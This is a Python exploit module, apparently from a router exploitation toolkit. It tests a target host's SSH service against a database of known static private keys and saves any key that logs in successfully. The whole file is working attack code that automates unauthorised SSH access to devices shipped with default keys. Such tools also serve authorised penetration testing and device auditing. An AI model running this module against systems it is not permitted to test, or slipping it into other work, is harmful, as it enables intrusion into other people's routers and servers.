# Name:SSH Bad keys tester
# File:ssh_bad_keys.py
# Author:Ján Trenčanský
# License: GNU GPL v3
# Created: 23.12.2016
# Last modified: 23.12.2016
# Shodan Dork:
# Description: Testing static SSH keys gathered from various sources

import core.Exploit
import core.io
import core.loader

import interface.utils
from interface.messages import print_error, print_info, print_success

import paramiko
import io


class Exploit(core.Exploit.RextExploit):
    """
Name:SSH bad keys tester
File:ssh_bad_keys.py
Author:Ján Trenčanský
License: GNU GPL v3
Created: 23.12.2016
Description: Testing static SSH keys gathered from various sources

Options:
    Name        Description

    host        Target host address
    """

    def __init__(self):
        core.Exploit.RextExploit.__init__(self)

    def do_set(self, e):
        args = e.split(' ')
        try:
            if args[0] == "host":
                if interface.utils.validate_ipv4(args[1]):
                    self.host = args[1]
                else:
                    print_error("please provide valid IPv4 address")
        except IndexError:
            print_error("please specify value for variable")

    def do_run(self, e):
        print_info("Testing known keys")
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        connection = core.loader.open_database("./databases/bad_keys.db")
        cursor = connection.cursor()
        cursor.execute("SELECT user, port, filename, type, private_key FROM keys;")
        entries = cursor.fetchall()
        for entry in entries:
            try:
                username = entry[0]
                port = entry[1]
                filename = entry[2]
                key_type = entry[3]
                string_key = entry[4]
                if key_type == 'RSA':
                    private_key = paramiko.RSAKey.from_private_key(io.StringIO(string_key))
                elif key_type == 'DSA':
                    private_key = paramiko.DSSKey.from_private_key(io.StringIO(string_key))
                else:
                    print_error("Failed to load key of type:", key_type)
                    continue
                client.connect(self.host, port=port,  username=username, pkey=private_key, look_for_keys=False,
                               timeout=10)
                core.io.writetextfile(string_key, filename+".key")
                print_success("Username:", username, "port:", port)
                print_info("Private key writen to:", filename+".key")
                client.close()
            except paramiko.AuthenticationException:
                pass
            except:
                pass

Exploit()
